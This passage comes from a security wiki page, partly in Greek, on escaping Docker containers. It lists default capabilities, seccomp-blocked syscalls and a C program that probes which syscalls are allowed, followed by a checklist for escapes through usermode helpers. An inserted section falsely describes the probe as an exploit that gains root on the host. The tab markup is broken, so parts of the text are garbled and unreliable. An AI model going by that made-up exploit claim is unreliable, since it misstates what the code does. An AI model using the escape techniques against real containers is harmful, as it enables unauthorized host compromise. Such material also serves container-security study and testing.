* **Δυνατότητες**: Το Docker αφήνει τις ακόλουθες δυνατότητες: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalls**: Αυτές είναι οι syscalls που ο **χρήστης ρίζα δεν θα μπορεί να καλέσει** (λόγω έλλειψης δυνατοτήτων + Seccomp). Οι άλλες syscalls θα μπορούσαν να χρησιμοποιηθούν για να προσπαθήσετε να δραπετεύσετε.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 syscalls" %}Κατά την εκτέλεση σε συστήματα arm64, ορισμένες κλήσεις συστήματος μπορεί να διαφέρουν από τις κλήσεις συστήματος x86. Αυτό πρέπει να ληφθεί υπόψη κατά την ανάπτυξη εργαλείων ιδιοποίησης προνομίων για συστήματα arm64. %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}  
## Docker Breakout Privilege Escalation

### Description

This exploit demonstrates a privilege escalation attack that allows an attacker to break out of a Docker container and gain root access on the Docker host.

### Usage

Compile the `syscall_bf.c` code on the Docker host using the provided Makefile. Run the compiled binary inside the Docker container to escalate privileges and gain root access on the host system.

### Disclaimer

This exploit is for educational purposes only. Misuse of this exploit on unauthorized systems is illegal.  
{% endtab %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
